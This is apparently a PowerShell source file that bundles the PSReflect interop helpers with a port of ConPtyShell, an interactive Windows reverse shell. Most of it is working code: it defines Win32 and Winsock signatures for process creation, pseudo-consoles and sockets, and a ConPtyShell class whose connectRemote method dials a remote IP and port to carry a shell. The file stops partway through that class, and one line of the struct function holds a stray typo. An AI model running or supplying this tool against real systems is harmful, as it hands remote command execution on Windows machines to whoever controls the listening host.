


# _____   _____   _____  ______ ______ _      ______ _____ _______ 
# |  __ \ / ____| |  __ \|  ____|  ____| |    |  ____/ ____|__   __|
# | |__) | (___   | |__) | |__  | |__  | |    | |__ | |       | |   
# |  ___/ \___ \  |  _  /|  __| |  __| | |    |  __|| |       | |   
# | |     ____) | | | \ \| |____| |    | |____| |___| |____   | |   
# |_|    |_____/  |_|  \_\______|_|    |______|______\_____|  |_|   

# We use PS Reflect, developped by Matt Graeber
# to more easily import C# function in PowerShell

# Reference:
# https://learn-powershell.net/2016/08/28/revisiting-netsession-function-using-psreflect/
# https://github.com/mattifestation/PSReflect/

#Requires -Version 2

function New-InMemoryModule
{
<#
.SYNOPSIS

Creates an in-memory assembly and module

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

When defining custom enums, structs, and unmanaged functions, it is
necessary to associate to an assembly module. This helper function
creates an in-memory module that can be passed to the 'enum',
'struct', and Add-Win32Type functions.

.PARAMETER ModuleName

Specifies the desired name for the in-memory assembly and module. If
ModuleName is not provided, it will default to a GUID.

.EXAMPLE

$Module = New-InMemoryModule -ModuleName Win32
#>

    Param
    (
        [Parameter(Position = 0)]
        [ValidateNotNullOrEmpty()]
        [String]
        $ModuleName = [Guid]::NewGuid().ToString()
    )

    $AppDomain = [AppDomain]::CurrentDomain
    $LoadedAssemblies = $AppDomain.GetAssemblies()

    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }

    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    if ($IsCoreCLR) {
        $AssemblyBuilder = [Reflection.Emit.AssemblyBuilder]::DefineDynamicAssembly($DynAssembly, 'Run')
    } else {
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    }

    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)

    return $ModuleBuilder
}


# A helper function used to reduce typing while defining function
# prototypes for Add-Win32Type.
function func
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,

        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,

        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,

        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,

        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,

        [String]
        $EntryPoint,

        [Switch]
        $SetLastError
    )

    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }

    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }

    New-Object PSObject -Property $Properties
}


function Add-Win32Type
{
<#
.SYNOPSIS

Creates a .NET type for an unmanaged Win32 function.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: func

.DESCRIPTION

Add-Win32Type enables you to easily interact with unmanaged (i.e.
Win32 unmanaged) functions in PowerShell. After providing
Add-Win32Type with a function signature, a .NET type is created
using reflection (i.e. csc.exe is never called like with Add-Type).

The 'func' helper function can be used to reduce typing when defining
multiple function definitions.

.PARAMETER DllName

The name of the DLL.

.PARAMETER FunctionName

The name of the target function.

.PARAMETER EntryPoint

The DLL export function name. This argument should be specified if the
specified function name is different than the name of the exported
function.

.PARAMETER ReturnType

The return type of the function.

.PARAMETER ParameterTypes

The function parameters.

.PARAMETER NativeCallingConvention

Specifies the native calling convention of the function. Defaults to
stdcall.

.PARAMETER Charset

If you need to explicitly call an 'A' or 'W' Win32 function, you can
specify the character set.

.PARAMETER SetLastError

Indicates whether the callee calls the SetLastError Win32 API
function before returning from the attributed method.

.PARAMETER Module

The in-memory module that will host the functions. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER Namespace

An optional namespace to prepend to the type. Add-Win32Type defaults
to a namespace consisting only of the name of the DLL.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$FunctionDefinitions = @(
  (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
  (func kernel32 GetModuleHandle ([Intptr]) @([String]) -SetLastError),
  (func ntdll RtlGetCurrentPeb ([IntPtr]) @())
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$Kernel32 = $Types['kernel32']
$Ntdll = $Types['ntdll']
$Ntdll::RtlGetCurrentPeb()
$ntdllbase = $Kernel32::GetModuleHandle('ntdll')
$Kernel32::GetProcAddress($ntdllbase, 'RtlGetCurrentPeb')

.NOTES

Inspired by Lee Holmes' Invoke-WindowsApi http://poshcode.org/2189

When defining multiple function prototypes, it is ideal to provide
Add-Win32Type with an array of function signatures. That way, they
are all incorporated into the same in-memory module.
#>

    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $DllName,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $FunctionName,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [String]
        [ValidateNotNullOrEmpty()]
        $EntryPoint,

        [Parameter(Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Type]
        $ReturnType,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Type[]]
        $ParameterTypes,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,

        [Parameter(ValueFromPipelineByPropertyName = $True)]
        [Switch]
        $SetLastError,

        [Parameter(Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )

    BEGIN
    {
        $TypeHash = @{}
    }

    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            # Define one type for each DLL
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }

            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)

            # Make each ByRef parameter an Out parameter
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }

                $i++
            }

            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }

            if ($EntryPoint) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }

            # Equivalent to C# version of [DllImport(DllName)]
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName,
                [Reflection.PropertyInfo[]] @(),
                [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))

            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }

    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }

        $ReturnTypes = @{}

        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()

            $ReturnTypes[$Key] = $Type
        }

        return $ReturnTypes
    }
}


function psenum
{
<#
.SYNOPSIS

Creates an in-memory enumeration for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

The 'psenum' function facilitates the creation of enums entirely in
memory using as close to a "C style" as PowerShell will allow.

.PARAMETER Module

The in-memory module that will host the enum. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the enum.

.PARAMETER Type

The type of each enum element.

.PARAMETER EnumElements

A hashtable of enum elements.

.PARAMETER Bitfield

Specifies that the enum should be treated as a bitfield.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageSubsystem = psenum $Mod PE.IMAGE_SUBSYSTEM UInt16 @{
    UNKNOWN =                  0
    NATIVE =                   1 # Image doesn't require a subsystem.
    WINDOWS_GUI =              2 # Image runs in the Windows GUI subsystem.
    WINDOWS_CUI =              3 # Image runs in the Windows character subsystem.
    OS2_CUI =                  5 # Image runs in the OS/2 character subsystem.
    POSIX_CUI =                7 # Image runs in the Posix character subsystem.
    NATIVE_WINDOWS =           8 # Image is a native Win9x driver.
    WINDOWS_CE_GUI =           9 # Image runs in the Windows CE subsystem.
    EFI_APPLICATION =          10
    EFI_BOOT_SERVICE_DRIVER =  11
    EFI_RUNTIME_DRIVER =       12
    EFI_ROM =                  13
    XBOX =                     14
    WINDOWS_BOOT_APPLICATION = 16
}

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Enum. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,

        [Switch]
        $Bitfield
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    $EnumType = $Type -as [Type]

    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)

    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }

    foreach ($Key in $EnumElements.Keys)
    {
        # Apply the specified enum type to each element
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }

    $EnumBuilder.CreateType()
}


# A helper function used to reduce typing while defining struct
# fields.
function field
{
    Param
    (
        [Parameter(Position = 0, Mandatory = $True)]
        [UInt16]
        $Position,

        [Parameter(Position = 1, Mandatory = $True)]
        [Type]
        $Type,

        [Parameter(Position = 2)]
        [UInt16]
        $Offset,

        [Object[]]
        $MarshalAs
    )

    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}


function struct
{
<#
.SYNOPSIS

Creates an in-memory struct for use in your PowerShell session.

Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: field

.DESCRIPTION

The 'struct' function facilitates the creation of structs entirely in
memory using as close to a "C style" as PowerShell will allow. Struct
fields are specified using a hashtable where each field of the struct
is comprosed of the order in which it should be defined, its .NET
type, and optionally, its offset and special marshaling attributes.

One of the features of 'struct' is that after your struct is defined,
it will come with a built-in GetSize method as well as an explicit
converter so that you can easily cast an IntPtr to the struct without
relying upon calling SizeOf and/or PtrToStructure in the Marshal
class.

.PARAMETER Module

The in-memory module that will host the struct. Use
New-InMemoryModule to define an in-memory module.

.PARAMETER FullName

The fully-qualified name of the struct.

.PARAMETER StructFields

A hashtable of fields. Use the 'field' helper function to ease
defining each field.

.PARAMETER PackingSize

Specifies the memory alignment of fields.

.PARAMETER ExplicitLayout

Indicates that an explicit offset for each field will be specified.

.PARAMETER CharSet

Dictates which character set marshaled strings should use.

.EXAMPLE

$Mod = New-InMemoryModule -ModuleName Win32

$ImageDosSignature = psenum $Mod PE.IMAGE_DOS_SIGNATURE UInt16 @{
    DOS_SIGNATURE =    0x5A4D
    OS2_SIGNATURE =    0x454E
    OS2_SIGNATURE_LE = 0x454C
    VXD_SIGNATURE =    0x454C
}

$ImageDosHeader = struct $Mod PE.IMAGE_DOS_HEADER @{
    e_magic =    field 0 $ImageDosSignature
    e_cblp =     field 1 UInt16
    e_cp =       field 2 UInt16
    e_crlc =     field 3 UInt16
    e_cparhdr =  field 4 UInt16
    e_minalloc = field 5 UInt16
    e_maxalloc = field 6 UInt16
    e_ss =       field 7 UInt16
    e_sp =       field 8 UInt16
    e_csum =     field 9 UInt16
    e_ip =       field 10 UInt16
    e_cs =       field 11 UInt16
    e_lfarlc =   field 12 UInt16
    e_ovno =     field 13 UInt16
    e_res =      field 14 UInt16[] -MarshalAs @('ByValArray', 4)
    e_oemid =    field 15 UInt16
    e_oeminfo =  field 16 UInt16
    e_res2 =     field 17 UInt16[] -MarshalAs @('ByValArray', 10)
    e_lfanew =   field 18 Int32
}

# Example of using an explicit layout in order to create a union.
$TestUnion = struct $Mod TestUnion @{
    field1 = field 0 UInt32 0
    field2 = field 1 IntPtr 0
} -ExplicitLayout

.NOTES

PowerShell purists may disagree with the naming of this function but
again, this was developed in such a way so as to emulate a "C style"
definition as closely as possible. Sorry, I'm not going to name it
New-Struct. :P
#>

    [OutputType([Type])]
    Param
    (
        [Parameter(Position = 1, Mandatory = $True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,

        [Parameter(Position = 2, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,

        [Parameter(Position = 3, Mandatory = $True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,

        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,

        [Switch]
        $ExplicitLayout,

        [System.Runtime.InteropServices.CharSet]
        $CharSet = [System.Runtime.InteropServices.CharSet]::Ansi
    )

    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }

    [Reflection.TypeAttributes] $StructAttributes = 'Class,
        Public,
        Sealed,
        BeforeFieldInit'

    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }

    switch($CharSet)
    {
        Ansi
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AnsiClass
        }
        Auto
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::AutoClass
        }
        Unicode
        {
            $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::UnicodeClass
        s}
    }

    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))

    $Fields = New-Object Hashtable[]($StructFields.Count)

    # Sort each field according to the orders specified
    # Unfortunately, PSv2 doesn't have the luxury of the
    # hashtable [Ordered] accelerator.
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }

    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']

        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']

        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')

        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }

            $NewField.SetCustomAttribute($AttribBuilder)
        }

        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }

    # Make the struct aware of its own size.
    # No more having to call [Runtime.InteropServices.Marshal]::SizeOf!
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    # Thanks for the help, Jason Shirk!
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)

    # Allow for explicit casting from an IntPtr
    # No more having to call [Runtime.InteropServices.Marshal]::PtrToStructure!
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)

    $StructBuilder.CreateType()
}




# _____            _____  _          _____ _          _ _ 
# / ____|          |  __ \| |        / ____| |        | | |
# | |     ___  _ __ | |__) | |_ _   _| (___ | |__   ___| | |
# | |    / _ \| '_ \|  ___/| __| | | |\___ \| '_ \ / _ \ | |
# | |___| (_) | | | | |    | |_| |_| |____) | | | |  __/ | |
# \_____\___/|_| |_|_|     \__|\__, |_____/|_| |_|\___|_|_|
#                               __/ |                      
#                              |___/                       

# This is the part where we port ConPtyShell to PowerShell


$Mod = New-InMemoryModule -ModuleName Win32
$global:Mod = $Mod

$global:STARTUPINFO = struct $Mod STARTUPINFO @{
    cb =            field 0 Int32
    lpReserved =    field 1 String
    lpDesktop =     field 2 String
    lpTitle =       field 3 String
    dwX =           field 4 Int32
    dwY =           field 5 Int32
    dwXSize =       field 6 Int32
    dwYSize =       field 7 Int32
    dwXCountChars = field 8 Int32
    dwYCountChars = field 9 Int32
    dwFillAttribute = field 10 Int32
    dwFlags =       field 11 Int32
    wShowWindow =   field 12 Int16
    cbReserved2 =   field 13 Int16
    lpReserved2 =   field 14 IntPtr
    hStdInput =     field 15 IntPtr
    hStdOutput =    field 16 IntPtr
    hStdError =     field 17 IntPtr
}

$global:PROCESS_INFORMATION =  struct $Mod PROCESS_INFORMATION @{
    hProcess =      field 0 IntPtr
    hTread =        field 1 IntPtr
    dwProcessId =   field 2 int
    dwThreadId =    field 3 int
}

$global:SECURITY_ATTRIBUTES_TYPE = struct $Mod SECURITY_ATTRIBUTES @{
    nLength =               field 0 Int
    lpSecurityDescriptor =  field 1 IntPtr
    bInheritHandle =        field 2 Int
}

$global:COORD = struct $Mod COORD @{
    X = field 0 Int16
    Y = field 1 Int16
}

$global:WSAData_TYPE = struct $Mod WSAData @{
    wVersion = field 0 Int16
    wHighVersion = field 1 Int16
    iMaxSockets = field 2 Int16
    iMaxUdpDg = field 3 Int16
    lpVendorInfo = field 4 IntPtr
    szDescription = field 5 String -MarshalAs @('ByValTStr', 257)
    szSystemStatus = field 6 String -MarshalAs @('ByValTStr', 129)
}

$GUID = struct $Mod GUID @{
    Data1 = field 0 Int32
    Data2 = field 1 Uint16
    Data3 = field 2 Uint16
    Data4 = field 3 byte[] -MarshalAs @('ByValArray', 8)
}

$WSAPROTOCOLCHAIN = struct $Mod WSAPROTOCOLCHAIN @{
    ChainLen = field 0 Int32
    ChainEntries = field 1 UInt32[] -MarshalAs @('ByValArray', 7)
}

$global:WSAPROTOCOL_INFO_TYPE = struct $Mod WSAPROTOCOL_INFO @{
    dwServiceFlags1 =   field 0 UInt32
    dwServiceFlags2 =   field 1 UInt32
    dwServiceFlags3 =   field 2 UInt32
    dwServiceFlags4 =   field 3 UInt32
    dwProviderFlags =   field 4 UInt32
    ProviderId =        field 5 $GUID
    dwCatalogEntryId =  field 6 uint32
    ProtocolChain =     field 7 $WSAPROTOCOLCHAIN
    iVersion =          field 8 Int32
    iAddressFamily =    field 9 Int32
    iMaxSockAddr =      field 10 Int32
    iMinSockAddr =      field 11 Int32
    iSocketType =       field 12 Int32
    iProtocol =         field 13 Int32
    iProtocolMaxOffset= field 14 Int32
    iNetworkByteOrder = field 15 Int32
    iSecurityScheme =   field 16 Int32
    dwMessageSize =     field 17 UInt32
    dwProviderReserved= field 18 UInt32
    szProtocol =        field 19 String -MarshalAs @('ByValTStr', 256)
}

$global:SOCKADDR_IN = struct $Mod SOCKADDR_IN @{
    sin_family = field 0 Int16
    sin_port = field 1 Int16
    sin_addr = field 2 UInt32
    sin_zero = field 3 Int64
}

$FunctionDefinitions = @(
    (func kernel32 CreateProcess ([Bool]) @(
        [String], # lpApplicationName
        [String], # lpCommandLine
        [IntPtr], # lpProcessAttributes
        [IntPtr], # lpThreadAttributes
        [Bool],   # bInheritHandles
        [UInt32], # dwCreationFlags
        [IntPtr], # lpEnvironment,
        [String], # lpCurrentDirectory,
        $global:STARTUPINFO.MakeByRefType(), # lpStartupInfo,
        $global:PROCESS_INFORMATION.MakeByRefType() # lpProcessInformation
    )),
    (func kernel32 SetStdHandle ([IntPtr]) @([Int32], [IntPtr])),  
    (func kernel32 GetStdHandle ([IntPtr]) @([Int32])),  
    (func kernel32 CloseHandle ([Bool]) @([IntPtr])),
    (func kernel32 CreatePipe ([Bool]) @([IntPtr].MakeByRefType(), [IntPtr].MakeByRefType(), $global:SECURITY_ATTRIBUTES_TYPE.MakeByRefType(), [UInt32]) -EntryPoint CreatePipe -SetLastError),
#    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
    (func kernel32 ReadFile ([Bool]) @([IntPtr], [Byte[]], [UInt32], [UInt32], [IntPtr]) -SetLastError),

    (func kernel32 CreatePseudoConsole ([Int32]) @($global:COORD.MakeByRefType(), [IntPtr], [IntPtr], [UInt32], [IntPtr])),
    (func kernel32 ClosePseudoConsole ([Int32]) @([IntPtr])),
   
    (func kernel32 CreateFile ([IntPtr]) @([String], [UInt32], [UInt32], [IntPtr], [UInt32], [UInt32], [IntPtr])),
    (func kernel32 GetModuleHandle ([IntPtr]) @([String]) -SetLastError),
    (func kernel32 GetProcAddress ([IntPtr]) @([IntPtr], [String]) -Charset Ansi -SetLastError),
    (func ws2_32 WSASocket ([IntPtr]) @(
        [Int32], # AddressFamily
        [Int32], # SocketType
        [Int32], # ProtocolType
        [IntPtr], # ProtocolInfo
        [UInt32], # Group
        [Int32]  # Flags
    )  -Charset Ansi -SetLastError),
    (func ws2_32 connect ([Int32])  @([IntPtr], $global:SOCKADDR_IN.MakeByRefType(), [Int32])),
    (func ws2_32 htons   ([UInt16]) @([UInt16]) -SetLastError),
    (func ws2_32 inet_addr ([UInt32]) @([String]) -Charset Ansi -SetLastError),
    (func ws2_32 WSAGetLastError ([Int32])),
    (func ws2_32 WSAStartup ([Int32]) @([Int16], $global:WSAData_TYPE.MakeByRefType())),
    (func ws2_32 recv ([Int32]) @([IntPtr], [Byte[]], [Int32], [UInt32]) -Charset Auto -SetLastError),
    (func ws2_32 send ([Int32]) @([IntPtr], [Byte[]], [Int32], [UInt32]) -Charset Auto -SetLastError),
    (func ntdll NtSuspendProcess ([UInt32]) @([IntPtr])),
    (func ntdll NtResumeProcess ([UInt32]) @([IntPtr]))
)

$Types = $FunctionDefinitions | Add-Win32Type -Module $Mod -Namespace 'Win32'
$global:Kernel32 = $Types['kernel32']
$global:ws2_32 = $Types['ws2_32']
$global:ntdll = $Types['ntdll']


class ConPtyShellException : System.Exception {
    hidden [string]$error_string = "[-] ConPtyShellException: "

    ConPtyShellException() : base() { }

    ConPtyShellException([string]$message) : base($this.error_string + $message) { }
}


class ConPtyShell {
    hidden static [Int32]  $STARTF_USESTDHANDLES = 0x00000100
    hidden static [int]    $BUFFER_SIZE_PIPE = 0x100000
    hidden static [UInt32] $GENERIC_READ = 2147483648
    hidden static [UInt32] $GENERIC_WRITE    = 0x40000000
    hidden static [UInt32] $FILE_SHARE_READ  = 0x00000001
    hidden static [UInt32] $FILE_SHARE_WRITE = 0x00000002
    hidden static [UInt32] $FILE_ATTRIBUTE_NORMAL = 0x80
    hidden static [UInt32] $OPEN_EXISTING = 3

    hidden static [Int32] $STD_INPUT_HANDLE  = -10;
    hidden static [Int32] $STD_OUTPUT_HANDLE = -11;
    hidden static [Int32] $STD_ERROR_HANDLE  = -12;

    $ProccessInformation = $global:ProccessInformation

    hidden static [void] InitWSAThread() {
        $data = New-Object -TypeName "WSAData"

        if ($global:ws2_32::WSAStartup(2 -shl 8 -bor 2, [ref]$data) -ne 0) {
            $error_code = $global:ws2_32::WSAGetLastError()
            throw [ConPtyShellException] "WSAStartup failed with error code: $error_code"
        }
    }

    hidden static [IntPtr] connectRemote([string] $remoteIp, [UInt32] $remotePort) {
        $ws2_32 = $global:ws2_32

        [int] $port = $remotePort
        [int] $error = 0
        [string] $host = $remoteIp

        [IntPtr] $socket = [IntPtr]::Zero
        $socket = $ws2_32::WSASocket(2, 1, 0, [IntPtr]::Zero, 0, 0x01)

        $sockinfo = New-Object -TypeName "SOCKADDR_IN"
        $sockinfo.sin_family = 2
        $sockinfo.sin_addr = $ws2_32::inet_addr($host)
        $sockinfo.sin_port = [Int16] $ws2_32::htons($port)

        if ($ws2_32::connect($socket, [ref]$sockinfo, $global:SOCKADDR_IN::GetSize()) -ne 0) {
            $error_code = $global:ws2_32::WSAGetLastError()
            throw [ConPtyShellException] "WSAConnect failed with error code: $error_code"
        }

        return $socket
    }

    hidden static [void] TryParseRowsColsFromSocket([IntPtr] $shellSocket, [ref] $rows, [ref] $cols) {
        Start-Sleep -Milliseconds 500 # little tweak for slower connections
        $received = New-Object Byte[] 100
        
        $global:ws2_32::recv($shellSocket, $received, 100, 0)  

        try {
            [String] $sizeReceived = [System.Text.Encoding]::UTF8.GetString($received)

            [String] $rowsString = $sizeReceived.Split(' ')[0].Trim()
            [String] $colsString = $sizeReceived.Split(' ')[1].Trim()

            $rows.Value = [UInt32]$rowsString
            $cols.Value = [UInt32]$colsString

        } catch {}
    }

    hidden static [void] CreatePipes([ref] $InputPipeRead, [ref] $InputPipeWrite, [ref] $OutputPipeRead, [ref] $OutputPipeWrite) {
        $Kernel32 = $global:Kernel32

        $pSec = New-Object -TypeName "SECURITY_ATTRIBUTES"
        $pSec.nLength = $global:SECURITY_ATTRIBUTES_TYPE::GetSize()
        $pSec.bInheritHandle = 1
        $pSec.lpSecurityDescriptor = [IntPtr]::Zero
        
        if (! $Kernel32::CreatePipe($InputPipeRead, $InputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
            throw [ConPtyShellException] "Could not create the InputPipe"
        }

        if (! $Kernel32::CreatePipe($OutputPipeRead, $OutputPipeWrite, [ref]$pSec, [ConPtyShell]::BUFFER_SIZE_PIPE)) {
            throw [ConPtyShellException] "Could not create the OutputPipe"
        }
    }

    hidden static [void] InitConsole([ref] $oldStdIn, [ref] $oldStdOut, [ref] $oldStdErr) {
        $Kernel32 = $global:Kernel32

        $oldStdIn.Value  = $Kernel32::GetStdHandle([ConPtyShell]::STD_INPUT_HANDLE);
        $oldStdOut.Value = $Kernel32::GetStdHandle([ConPtyShell]::STD_OUTPUT_HANDLE);
        $oldStdErr.Value = $Kernel32::GetStdHandle([ConPtyShell]::STD_ERROR_HANDLE);

